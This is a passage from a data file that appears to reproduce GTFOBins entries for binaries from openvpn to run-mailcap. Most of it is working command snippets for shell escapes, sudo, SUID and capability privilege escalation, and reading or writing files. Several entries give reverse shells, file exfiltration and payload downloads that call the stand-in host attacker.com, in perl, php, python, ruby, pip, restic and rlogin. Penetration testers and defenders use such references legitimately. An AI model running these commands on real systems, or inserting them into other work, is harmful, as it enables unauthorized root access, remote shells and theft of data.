                        code: 'LFILE=file_to_read\nopenvpn --config "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n",
                    },
                    {
                        description:
                            "The file is actually parsed and the first partial wrong line is returned in an error message.",
                        code: 'LFILE=file_to_read\n./openvpn --config "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
                    },
                    {
                        description:
                            "The file is actually parsed and the first partial wrong line is returned in an error message.",
                        code: 'LFILE=file_to_read\nsudo openvpn --config "$LFILE"\n',
                    },
                ],
            },
        },
        openvt: {
            functions: {
                sudo: [
                    {
                        description:
                            "The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.",
                        code: 'COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c "$COMMAND >$TF 2>&1"\ncat $TF\n',
                    },
                ],
            },
        },
        opkg: {
            functions: {
                sudo: [
                    {
                        description:
                            "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n",
                        code: "sudo opkg install x_1.0_all.deb\n",
                    },
                ],
            },
        },
        pandoc: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\npandoc -t plain "$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho DATA | pandoc -t plain -o "$LFILE"\n',
                    },
                ],
                shell: [
                    {
                        description:
                            "Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\npandoc -L $TF /dev/null\n",
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_write\necho DATA | ./pandoc -t plain -o "$LFILE"\n',
                    },
                ],
                "limited-suid": [
                    {
                        description:
                            "Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\n./pandoc -L $TF /dev/null\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null\n",
                    },
                ],
            },
        },
        paste: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\npaste $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\npaste $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo paste $LFILE\n",
                    },
                ],
            },
        },
        pax: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.",
                        code: 'LFILE=file_to_read\npax -w "$LFILE"\n',
                    },
                ],
            },
        },
        pdb: {
            description: "This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n",
                    },
                ],
            },
        },
        pdflatex: {
            functions: {
                shell: [
                    {
                        code: "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The read file will be part of the output.",
                        code: "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
                    },
                ],
                sudo: [
                    {
                        description: "The read file will be part of the output.",
                        code: "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
                    },
                    {
                        code: "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
            },
        },
        pdftex: {
            functions: {
                shell: [
                    {
                        code: "pdftex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./pdftex --shell-escape '\\write18{/bin/sh}\\end'\n",
                    },
                ],
            },
        },
        perf: {
            functions: {
                shell: [
                    {
                        code: "perf stat /bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./perf stat /bin/sh -p\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo perf stat /bin/sh\n",
                    },
                ],
            },
        },
        perl: {
            functions: {
                shell: [
                    {
                        code: "perl -e 'exec \"/bin/sh\";'",
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nperl -ne print $LFILE\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nperl -e \'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'\n',
                    },
                ],
                suid: [
                    {
                        code: "./perl -e 'exec \"/bin/sh\";'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo perl -e 'exec \"/bin/sh\";'",
                    },
                ],
                capabilities: [
                    {
                        code: "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
                    },
                ],
            },
        },
        perlbug: {
            functions: {
                shell: [
                    {
                        code: "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'",
                    },
                ],
            },
        },
        pexec: {
            functions: {
                shell: [
                    {
                        code: "pexec /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./pexec /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo pexec /bin/sh",
                    },
                ],
            },
        },
        pg: {
            functions: {
                shell: [
                    {
                        code: "pg /etc/profile\n!/bin/sh\n",
                    },
                ],
                "file-read": [
                    {
                        code: "pg file_to_read",
                    },
                ],
                sudo: [
                    {
                        code: "sudo pg /etc/profile\n!/bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./pg file_to_read",
                    },
                ],
            },
        },
        php: {
            functions: {
                shell: [
                    {
                        code: 'export CMD="/bin/sh"\nphp -r \'system(getenv("CMD"));\'\n',
                    },
                    {
                        code: 'export CMD="/bin/sh"\nphp -r \'passthru(getenv("CMD"));\'\n',
                    },
                    {
                        code: 'export CMD="/bin/sh"\nphp -r \'print(shell_exec(getenv("CMD")));\'\n',
                    },
                    {
                        code: 'export CMD="/bin/sh"\nphp -r \'$r=array(); exec(getenv("CMD"), $r); print(join("\\\\n",$r));\'\n',
                    },
                    {
                        code: 'export CMD="/bin/sh"\nphp -r \'$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }\'\n',
                    },
                ],
                command: [
                    {
                        code: 'export CMD="id"\nphp -r \'$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}\'\n',
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nphp -r \'$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.",
                        code: "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r \'$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);\'\n',
                    },
                ],
                suid: [
                    {
                        code: "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n",
                    },
                ],
                sudo: [
                    {
                        code: 'CMD="/bin/sh"\nsudo php -r "system(\'$CMD\');"\n',
                    },
                ],
                capabilities: [
                    {
                        code: 'CMD="/bin/sh"\n./php -r "posix_setuid(0); system(\'$CMD\');"\n',
                    },
                ],
                "file-read": [
                    {
                        code: "export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'\n",
                    },
                ],
                "file-write": [
                    {
                        description: "write data to a file, filename should be absolute.",
                        code: 'export LFILE=file_to_write\nphp -r \'file_put_contents(getenv("LFILE"), "DATA");\'\n',
                    },
                ],
            },
        },
        pic: {
            functions: {
                "file-read": [
                    {
                        description: "The output is prefixed with a some content as a header.",
                        code: "LFILE=file_to_read\npic $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "pic -U\n.PS\nsh X sh X\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo pic -U\n.PS\nsh X sh X\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./pic -U\n.PS\nsh X sh X\n",
                    },
                ],
            },
        },
        pico: {
            functions: {
                shell: [
                    {
                        code: "pico\n^R^X\nreset; sh 1>&0 2>&0\n",
                    },
                    {
                        description:
                            "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
                        code: "pico -s /bin/sh\n/bin/sh\n^T\n",
                    },
                ],
                "file-write": [
                    {
                        code: "pico file_to_write\nDATA\n^O\n",
                    },
                ],
                "file-read": [
                    {
                        code: "pico file_to_read",
                    },
                ],
                "limited-suid": [
                    {
                        description:
                            "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
                        code: "./pico -s /bin/sh\n/bin/sh\n^T\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n",
                    },
                ],
            },
        },
        pidstat: {
            functions: {
                command: [
                    {
                        code: "COMMAND=id\npidstat -e $COMMAND\n",
                    },
                ],
                sudo: [
                    {
                        code: "COMMAND=id\nsudo pidstat -e $COMMAND\n",
                    },
                ],
                suid: [
                    {
                        code: "COMMAND=id\n./pidstat -e $COMMAND\n",
                    },
                ],
            },
        },
        pip: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho \'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\' > $TF/setup.py\npip install $TF\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\' > $TF/setup.py\npip install $TF\n',
                    },
                    {
                        description: "Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nTF=$(mktemp -d)\necho \'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\' > $TF/setup.py\npip install $TF\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request. It needs an absolute local file path.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\' > $TF/setup.py\npip install $TF\n',
                    },
                ],
                "file-write": [
                    {
                        description: "It needs an absolute local file path.",
                        code: "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The read file content is corrupted as wrapped within an exception error.",
                        code: "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF\n",
                    },
                ],
                "library-load": [
                    {
                        code: "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n",
                    },
                ],
            },
        },
        pkexec: {
            functions: {
                sudo: [
                    {
                        code: "sudo pkexec /bin/sh",
                    },
                ],
            },
        },
        pkg: {
            functions: {
                sudo: [
                    {
                        description:
                            "It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n```\n",
                        code: "sudo pkg install -y --no-repo-update ./x-1.0.txz\n",
                    },
                ],
            },
        },
        posh: {
            functions: {
                shell: [
                    {
                        code: "posh",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./posh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo posh",
                    },
                ],
            },
        },
        pr: {
            description: "Some bytes are altered so it might not be suitable for binary files.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\npr -T $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\npr -T $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\npr -T $LFILE\n",
                    },
                ],
            },
        },
        pry: {
            functions: {
                shell: [
                    {
                        code: 'pry\nsystem("/bin/sh")\n',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo pry\nsystem("/bin/sh")\n',
                    },
                ],
                "limited-suid": [
                    {
                        code: './pry\nsystem("/bin/sh")\n',
                    },
                ],
            },
        },
        psftp: {
            functions: {
                shell: [
                    {
                        code: "psftp\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "sudo psftp\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo psftp\n!/bin/sh\n",
                    },
                ],
            },
        },
        psql: {
            description:
                "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "psql\n\\?\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "psql\n\\?\n!/bin/sh\n",
                    },
                ],
            },
        },
        ptx: {
            description:
                'While the program is capable of reading the file, it outputs a "permuted index" of its content, thus altering it. Adjusting the options could yield more readable outputs.',
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nptx -w 5000 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./ptx -w 5000 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo ptx -w 5000 "$LFILE"\n',
                    },
                ],
            },
        },
        puppet: {
            functions: {
                shell: [
                    {
                        code: 'puppet apply -e "exec { \'/bin/sh -c \\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\"\': }"\n',
                    },
                ],
                "file-write": [
                    {
                        description: "The file path must be absolute.",
                        code: "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.",
                        code: "LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: 'sudo puppet apply -e "exec { \'/bin/sh -c \\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\"\': }"\n',
                    },
                ],
            },
        },
        pwsh: {
            functions: {
                shell: [
                    {
                        code: "pwsh",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\npwsh -c '\"DATA\" | Out-File $env:LFILE'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo pwsh",
                    },
                ],
            },
        },
        python: {
            description: "The payloads are compatible with both Python version 2 and 3.",
            functions: {
                shell: [
                    {
                        code: "python -c 'import os; os.system(\"/bin/sh\")'",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\npython -c \'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\'\n',
                    },
                    {
                        description: "Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\npython -c \'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\'\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e["URL"], e["LFILE"])\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'python -c \'open("file_to_write","w+").write("DATA")\'',
                    },
                ],
                "file-read": [
                    {
                        code: "python -c 'print(open(\"file_to_read\").read())'",
                    },
                ],
                "library-load": [
                    {
                        code: "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'",
                    },
                ],
                suid: [
                    {
                        code: './python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo python -c 'import os; os.system(\"/bin/sh\")'",
                    },
                ],
                capabilities: [
                    {
                        code: "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                    },
                ],
            },
        },
        rake: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The file is actually parsed and the first wrong line is returned in an error message.",
                        code: "LFILE=file-to-read\nrake -f $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "rake -p '`/bin/sh 1>&0`'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rake -p '`/bin/sh 1>&0`'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./rake -p '`/bin/sh 1>&0`'",
                    },
                ],
            },
        },
        rc: {
            functions: {
                shell: [
                    {
                        code: "rc -c '/bin/sh'",
                    },
                ],
                suid: [
                    {
                        code: "./rc -c '/bin/sh -p'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rc -c '/bin/sh'",
                    },
                ],
            },
        },
        readelf: {
            description:
                "Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nreadelf -a @$LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./readelf -a @$LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo readelf -a @$LFILE\n",
                    },
                ],
            },
        },
        red: {
            description: "Read and write files limited to the current directory.",
            functions: {
                "file-write": [
                    {
                        code: "red file_to_write\na\nDATA\n.\nw\nq\n",
                    },
                ],
                "file-read": [
                    {
                        code: "red file_to_read\n,p\nq\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo red file_to_write\na\nDATA\n.\nw\nq\n",
                    },
                ],
            },
        },
        redcarpet: {
            description: "The file is actually parsed as a Markdown file.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nredcarpet "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo redcarpet "$LFILE"\n',
                    },
                ],
            },
        },
        redis: {
            description: "This works with versions lower than 7.",
            functions: {
                "file-write": [
                    {
                        description:
                            "Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.",
                        code: 'IP=127.0.0.1\nredis-cli -h $IP\nconfig set dir dir_to_write_to\nconfig set dbfilename file_to_write\nset x "DATA"\nsave\n',
                    },
                ],
            },
        },
        restic: {
            description:
                'The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:\n\n```console\nRPORT=12345\nNAME=backup_name\n./rest-server --listen ":$RPORT"\nrestic init -r "rest:http://localhost:$RPORT/$NAME"\n```\n\nTo extract the data from the restic repository in the current directory on the attacker side:\n\n```console\nrestic restore -r "/tmp/restic/$NAME" latest --target .\n```\n\nUpload data to the attacker server with the following commands.\n',
            functions: {
                "file-upload": [
                    {
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"\n',
                    },
                ],
            },
        },
        rev: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nrev $LFILE | rev\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./rev $LFILE | rev\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo rev $LFILE | rev\n",
                    },
                ],
            },
        },
        rlogin: {
            description:
                "Usually `rlogin` is a symlink to `ssh`, the following works only when the *real* `rlogin` is used (e.g., from the `rsh-client` APT package).\n",
            functions: {
                "file-upload": [
                    {
                        description:
                            'Send contents of a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker system to capture the contents.\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\nThe file is corrupted by leading and trailing spurious data.\n',
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l "$(cat $LFILE)" -p $RPORT $RHOST\n',
                    },
                ],
            },
        },
        rlwrap: {
            functions: {
                shell: [
                    {
                        code: "rlwrap /bin/sh",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "This adds timestamps to the output file. This relies on the external `echo` command.",
                        code: 'LFILE=file_to_write\nrlwrap -l "$LFILE" echo DATA\n',
                    },
                ],
                suid: [
                    {
                        code: "./rlwrap -H /dev/null /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rlwrap /bin/sh",
                    },
                ],
            },
        },
        rpm: {
            functions: {
                shell: [
                    {
                        code: "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
                    },
                    {
                        code: "rpm --pipe '/bin/sh 0<&1'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
                    },
                    {
                        description:
                            "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n",
                        code: "sudo rpm -ivh x-1.0-1.noarch.rpm\n",
                    },
                ],
            },
        },
        rpmdb: {
            functions: {
                shell: [
                    {
                        code: "rpmdb --eval '%(/bin/sh 1>&2)'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./rpmdb --eval '%(/bin/sh 1>&2)'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rpmdb --eval '%(/bin/sh 1>&2)'",
                    },
                ],
            },
        },
        rpmquery: {
            functions: {
                shell: [
                    {
                        code: "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
                    },
                ],
            },
        },
        rpmverify: {
            functions: {
                shell: [
                    {
                        code: "rpmverify --eval '%(/bin/sh 1>&2)'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./rpmverify --eval '%(/bin/sh 1>&2)'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rpmverify --eval '%(/bin/sh 1>&2)'",
                    },
                ],
            },
        },
        rsync: {
            functions: {
                shell: [
                    {
                        code: "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                    },
                ],
                sudo: [
                    {
                        code: "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                    },
                ],
                suid: [
                    {
                        code: "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                    },
                ],
            },
        },
        rtorrent: {
            functions: {
                shell: [
                    {
                        code: 'echo "execute = /bin/sh,-c,\\"/bin/sh <$(tty) >$(tty) 2>$(tty)\\"" >~/.rtorrent.rc\nrtorrent\n',
                    },
                ],
                suid: [
                    {
                        code: 'echo "execute = /bin/sh,-p,-c,\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\"" >~/.rtorrent.rc\n./rtorrent\n',
                    },
                ],
            },
        },
        ruby: {
            functions: {
                shell: [
                    {
                        code: "ruby -e 'exec \"/bin/sh\"'",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e \'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.",
                        code: "export LPORT=8888\nruby -run -e httpd . -p $LPORT\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e \'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'ruby -e \'File.open("file_to_write", "w+") { |f| f.write("DATA") }\'',
                    },
                ],
                "file-read": [
                    {
                        code: "ruby -e 'puts File.read(\"file_to_read\")'",
                    },
                ],
                "library-load": [
                    {
                        code: 'ruby -e \'require "fiddle"; Fiddle.dlopen("lib.so")\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo ruby -e 'exec \"/bin/sh\"'",
                    },
                ],
                capabilities: [
                    {
                        code: "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
                    },
                ],
            },
        },
        "run-mailcap": {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "run-mailcap --action=view /etc/hosts\n!/bin/sh\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "run-mailcap --action=view file_to_read",
                    },
                ],
                "file-write": [
                    {
                        description:
